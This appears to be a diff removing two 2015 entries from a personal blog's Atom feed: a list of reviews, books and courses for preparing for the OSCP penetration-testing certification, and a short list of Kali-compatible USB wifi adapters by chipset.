-  <content type="html">&lt;p&gt;My current way for OSCP Certifications&lt;/p&gt;
-
-&lt;h3 id=&quot;what-is-oscp&quot;&gt;What is OSCP?&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&quot;&gt;What is OSCP&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.offensive-security.com/documentation/penetration-testing-with-backtrack.pdf&quot;&gt;Course Syllabus&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://firebitsbr.files.wordpress.com/2015/04/pentest-with-kali-by-firebits-rev01.png&quot;&gt;PWK MindMAP&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;oscp-reviews&quot;&gt;OSCP Reviews&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://0xdeadcode.se/archives/165&quot;&gt;http://0xdeadcode.se/archives/165&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://blog.l3g3ndary.org/2014/08/05/oscp-my-chronicle/&quot;&gt;http://blog.l3g3ndary.org/2014/08/05/oscp-my-chronicle/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://blog.nullmode.com/blog/2013/05/11/penetration-testing-with-backtrack-oscp/&quot;&gt;http://blog.nullmode.com/blog/2013/05/11/penetration-testing-with-backtrack-oscp/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://blog.pauldrapeau.com/oscp/&quot;&gt;http://blog.pauldrapeau.com/oscp/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://buffered.io/posts/oscp-and-me/&quot;&gt;http://buffered.io/posts/oscp-and-me/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://fourfourfourfour.co/2014/04/20/oscp-review/&quot;&gt;http://fourfourfourfour.co/2014/04/20/oscp-review/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://hackingandsecurity.blogspot.ru/2015/04/blog-post.html&quot;&gt;http://hackingandsecurity.blogspot.ru/2015/04/blog-post.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://netsec.ws/?p=398&quot;&gt;http://netsec.ws/?p=398&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://overflowsecurity.com/oscp-review-eagle11/&quot;&gt;http://overflowsecurity.com/oscp-review-eagle11/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://proactivedefender.blogspot.ru/2012/01/oscp-my-review.html&quot;&gt;http://proactivedefender.blogspot.ru/2012/01/oscp-my-review.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://stevendcampbell.blogspot.ru/2015/05/preparing-for-offensive-securitys-pwk.html&quot;&gt;http://stevendcampbell.blogspot.ru/2015/05/preparing-for-offensive-securitys-pwk.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.en-lightn.com/?p=941&quot;&gt;http://www.en-lightn.com/?p=941&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.exclarus.com/pentesting-with-kali-course-review-oscp/&quot;&gt;http://www.exclarus.com/pentesting-with-kali-course-review-oscp/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.jasonbernier.com/oscp-review/&quot;&gt;http://www.jasonbernier.com/oscp-review/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.lo0.ro/2014/05/23/my-oscp-certification-review/&quot;&gt;http://www.lo0.ro/2014/05/23/my-oscp-certification-review/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.mogozobo.com/?p=1831&quot;&gt;http://www.mogozobo.com/?p=1831&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.popped.io/2015/04/pwk-course-and-oscp-exam-review.html&quot;&gt;http://www.popped.io/2015/04/pwk-course-and-oscp-exam-review.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.primalsecurity.net/0x2-course-review-penetration-testing-with-kali-linux-oscp/&quot;&gt;http://www.primalsecurity.net/0x2-course-review-penetration-testing-with-kali-linux-oscp/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.securitysift.com/offsec-pwb-oscp/&quot;&gt;http://www.securitysift.com/offsec-pwb-oscp/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://leonjza.github.io/blog/2014/11/22/trying-harder-oscp-and-me/&quot;&gt;https://leonjza.github.io/blog/2014/11/22/trying-harder-oscp-and-me/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://n3ko1.github.io/certification/2015/05/27/oscp---offensive-security-certified-professional/&quot;&gt;https://n3ko1.github.io/certification/2015/05/27/oscp—offensive-security-certified-professional/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sathisharthars.wordpress.com/2015/01/23/offensive-security-certified-professional-pwk-my-experience/&quot;&gt;https://sathisharthars.wordpress.com/2015/01/23/offensive-security-certified-professional-pwk-my-experience/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sathisharthars.wordpress.com/2015/01/28/oscp-offensive-security-certified-professional-handy-tips-and-tricks&quot;&gt;https://sathisharthars.wordpress.com/2015/01/28/oscp-offensive-security-certified-professional-handy-tips-and-tricks&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://tehaurum.wordpress.com/2015/03/18/penetration-testing-with-kali-linux-and-the-oscp/&quot;&gt;https://tehaurum.wordpress.com/2015/03/18/penetration-testing-with-kali-linux-and-the-oscp/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.rcesecurity.com/2013/05/oscp-course-and-exam-review/&quot;&gt;https://www.rcesecurity.com/2013/05/oscp-course-and-exam-review/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.thesubtlety.com/the-oscp-penetration-testing-with-kali-linux/&quot;&gt;https://www.thesubtlety.com/the-oscp-penetration-testing-with-kali-linux/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://nwalsh.me/?p=102&quot;&gt;http://nwalsh.me/?p=102&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;read&quot;&gt;2 Read&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2015/07/03/offensive-security-bookmarks/&quot;&gt;Offensive Security Bookmarks&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;books&quot;&gt;Books&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Web-Penetration-Testing-Kali-Linux/dp/1782163166&quot;&gt;Web Penetration Testing with Kali Linux&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Penetration-Testing-Hands-On-Introduction-Hacking/dp/1593275641&quot;&gt;Penetration Testing: A Hands-On Introduction to Hacking&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Mastering-Linux-Advanced-Penetration-Testing/dp/1782163123&quot;&gt;Mastering Kali Linux for Advanced Penetration Testing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Building-Virtual-Pentesting-Advanced-Penetration/dp/1783284773&quot;&gt;Building Virtual Pentesting Labs for Advanced Penetration Testing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Penetration-Testing-shell-Keith-Makan/dp/1849695105&quot;&gt;Penetration Testing with the Bash shell&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Advanced-Penetration-Testing-Highly-Secured-Environments/dp/1849517746&quot;&gt;Advanced Penetration Testing for Highly-Secured Environments: The Ultimate Security Guide&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Metasploit-The-Penetration-Testers-Guide/dp/159327288X&quot;&gt;Metasploit: The Penetration Tester-s Guide&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Learning-Nessus-Penetration-Testing-Himanshu/dp/1783550996&quot;&gt;Learning Nessus for Penetration Testing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504&quot;&gt;Rtfm: Red Team Field Manual&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/How-Linux-Works-Superuser-Should/dp/1593270356&quot;&gt;How Linux Works: What Every Superuser Should Know&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Metasploit-Penetration-Testing-Cookbook-Abhinav/dp/1849517428&quot;&gt;Metasploit Penetration Testing Cookbook&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Penetration-Testing-Raspberry-Joseph-Muniz/dp/1784396435&quot;&gt;Penetration Testing with Raspberry Pi&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Hacking-Ethical-Hackers-Handbook-Edition/dp/0071742557&quot;&gt;Gray Hat Hacking the Ethical Hacker’s Handbook&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900&quot;&gt;Black Hat Python Python Programming for Hackers and Pentesters&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;watch&quot;&gt;2 Watch&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://software-testing.ru/trainings/schedule?task=3&amp;amp;cid=189&quot;&gt;Баранцев - Тестирование защищенности веб-приложений - RUS&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/user/PentestITLab/videos&quot;&gt;Pentestit.ru Video - RUS&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.packtpub.com/web-development/kali-linux-web-app-testingvideo&quot;&gt;Packtpub - Kali Linux Web App Testing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.coursetalk.com/providers/udemy/courses/certified-metasploit-framework-professional-module-1&quot;&gt;Udemy - Certified Metasploit Framework Professional&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.cybrary.it/course/advanced-penetration-testing/&quot;&gt;CybraryIT - Advanced Penetration Testing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.cybrary.it/course/post-exploitation-hacking/&quot;&gt;CybraryIT - Post Exploitation Hacking&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.infiniteskills.com/training/advanced-white-hat-hacking-and-penetration-testing.html&quot;&gt;InfiniteSkills - Advanced White Hat Hacking And Penetration Testing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.infiniteskills.com/training/learning-whitehat-hacking-and-penetration-testing.html&quot;&gt;InfiniteSkills - Learning Whitehat Hacking and Penetration Testing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.infiniteskills.com/training/reverse-engineering-and-exploit-development.html&quot;&gt;InfiniteSkills - Reverse Engineering and Exploit Development&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-  &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/06/19/oscp-prepare/&quot;&gt;OSCP Prepare&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on June 19, 2015.&lt;/p&gt;</content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[Kali Linux Compatible USB Wifi Adapters]]></title>
-  <link rel="alternate" type="text/html" href="https://jivoi.github.io/2015/06/16/kali-linux-compatible-usb-wifi-adapters/" />
-  <id>https://jivoi.github.io/2015/06/16/kali-linux-compatible-usb-wifi-adapters</id>
-  <updated>2015-06-16 18:25:18 +0300T00:00:00-00:00</updated>
-  <published>2015-06-16T00:00:00+03:00</published>
-  
-  <author>
-    <name>EK</name>
-    <uri>https://jivoi.github.io</uri>
-    <email>ekoz@protonmail.com</email>
-  </author>
-  <content type="html">&lt;p&gt;Below are the most stable usb wifi adapters:&lt;/p&gt;
-
-&lt;h3 id=&quot;atheros-ar9271-chipset--ieee-80211bgn&quot;&gt;Atheros AR9271 Chipset – IEEE 802.11B/G/N&lt;/h3&gt;
-&lt;ol&gt;
-  &lt;li&gt;Alfa AWUS036NHA&lt;/li&gt;
-  &lt;li&gt;TP-LINK TP-WN722N or TP-WN722NC&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;ralink-rt3070-chipset--ieee-80211bgn&quot;&gt;Ralink RT3070 Chipset – IEEE 802.11B/G/N&lt;/h3&gt;
-&lt;ol&gt;
-  &lt;li&gt;Alfa AWUS036NH&lt;/li&gt;
-  &lt;li&gt;Alfa AWUS036NEH&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;realtek-rtl8187l-chipset--ieee-80211bg&quot;&gt;Realtek RTL8187L Chipset – IEEE 802.11B/G&lt;/h3&gt;
-&lt;ol&gt;
-  &lt;li&gt;Alfa AWUS036H&lt;/li&gt;
-  &lt;li&gt;Alfa AWUS036EW&lt;/li&gt;
-&lt;/ol&gt;
-
-  &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/06/16/kali-linux-compatible-usb-wifi-adapters/&quot;&gt;Kali Linux Compatible USB Wifi Adapters&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on June 16, 2015.&lt;/p&gt;</content>
 </entry>
 
 </feed>
